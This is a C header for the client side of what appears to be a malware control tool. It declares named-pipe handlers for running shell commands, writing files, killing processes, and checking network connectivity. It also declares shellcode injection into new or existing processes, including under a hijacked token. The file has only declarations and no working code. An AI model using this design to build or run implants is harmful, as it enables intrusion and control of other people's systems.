#ifndef CLIENT_H
#define CLIENT_H

#include <Windows.h>
#include <stdbool.h>
#include <stdint.h>

#include "communication.h"
#include "def.h"

typedef struct network_info_
{
    uint16_t port;
    char ip[IP_SIZE];
} network_info_t;

typedef struct shellcode
{
    uint32_t pid;
    uint8_t buffer[];
} shellcode_t;

typedef struct shellcode_io_redirection_
{
    uint32_t enable_output_redirection;
    uint32_t shellcode_size;
    uint32_t has_process_arguments;
    uint32_t process_arguments_size;
    uint8_t buffer[];
} shellcode_io_redirection_t;

typedef struct command_
{
    uint32_t id;
    const char* description;
} command_t;

typedef enum command_id_
{
    STOP = 0,
    TERMINATE_PROCESS = 1,
    RUN_SHELL_COMMAND = 2,
    LIST_WORKING_DIRECTORY_FILES = 4,
    WRITE_FILE = 6,
    GET_WORKING_DIRECTORY = 7,
    CHANGE_WORKING_DIRECTORY = 8,
    LIST_RUNNING_PROCESSES = 9,
    CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_32BITS = 21,
    CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_64BITS = 22,
    CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_32BITS = 23,
    CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_64BITS = 24,
    OPEN_PROCESS_AND_INJECT_SHELLCODE_32BITS = 25,
    OPEN_PROCESS_AND_INJECT_SHELLCODE_64BITS = 26,
    HTTP_CONNECTIVITY_CHECK = 71,
    DNS_CONNECTIVITY_CHECK_WITH_IP = 72,
    ICMP_CONNECTIVITY_CHECK = 73,
    TCP_CONNECTIVITY_CHECK = 74,
    DNS_CONNECTIVITY_CHECK_WITHOUT_IP = 75,
    DISCONNECT = 99,
    TERMINATE_SERVER = 100,
} command_id_t;

extern const command_t COMMAND_LIST[];

typedef void (*handler_t)(HANDLE pipe, const char* target, uint32_t pid);

extern handler_t handlers[MAX_N_HANDLERS];

void cl_change_working_directory(HANDLE pipe, const char* target, uint32_t pid);

void cl_disconnect(HANDLE pipe, const char* target, uint32_t pid);

void cl_dns_connectivity_check_with_ip(HANDLE pipe, const char* target,
    uint32_t pid);

void cl_dns_connectivity_check_without_ip(HANDLE pipe, const char* target,
    uint32_t pid);

char* cl_format_malware_pipe_0(const char* target, uint32_t malware_pid);

char* cl_format_malware_pipe_1(const char* target);

size_t cl_get_command_list_length();

void cl_get_working_directory(HANDLE pipe, const char* target, uint32_t pid);

void cl_list_running_processes(HANDLE pipe, const char* target, uint32_t pid);

void cl_http_connectivity_check(HANDLE pipe, const char* target, uint32_t pid);

void cl_icmp_connectivity_check(HANDLE pipe, const char* target, uint32_t pid);

void cl_initialize_handlers(void);

void cl_inject_process(bool open_process, bool is_64, HANDLE pipe);

void cl_create_random_process_io_redirect_inject_shellcode_32(
    HANDLE pipe, const char* target, uint32_t pid);

void cl_create_random_process_io_redirect_inject_shellcode_64(
    HANDLE pipe, const char* target, uint32_t pid);

void cl_create_random_process_inject_shellcode_32(HANDLE pipe,
    const char* target,
    uint32_t pid);

void cl_create_random_process_inject_shellcode_64(HANDLE pipe,
    const char* target,
    uint32_t pid);

void cl_open_process_inject_shellcode_32(HANDLE pipe, const char* target,
    uint32_t pid);

void cl_open_process_inject_shellcode_64(HANDLE pipe, const char* target,
    uint32_t pid);

void cl_list_working_directory_files(HANDLE pipe, const char* target,
    uint32_t pid);

HANDLE cl_open_malware_pipe_aux(const char* path);

HANDLE cl_open_malware_pipe_0(const char* target, uint32_t malware_pid);

HANDLE cl_open_malware_pipe_1(const char* target);

void cl_print_connectivity(const packet_t* packet);

void cl_print_packet(const packet_t* packet);

void cl_process_command(HANDLE pipe, const char* target, uint32_t pid,
    uint32_t command);

void cl_terminate_process(HANDLE pipe, const char* target, uint32_t pid);

void cl_run_shell_command(HANDLE pipe, const char* target, uint32_t pid);

void cl_tcp_connectivity_check(HANDLE pipe, const char* target, uint32_t pid);

void cl_terminate_server(HANDLE pipe, const char* target, uint32_t pid);

void cl_write_file(HANDLE pipe, const char* target, uint32_t pid);

#endif // !CLIENT_H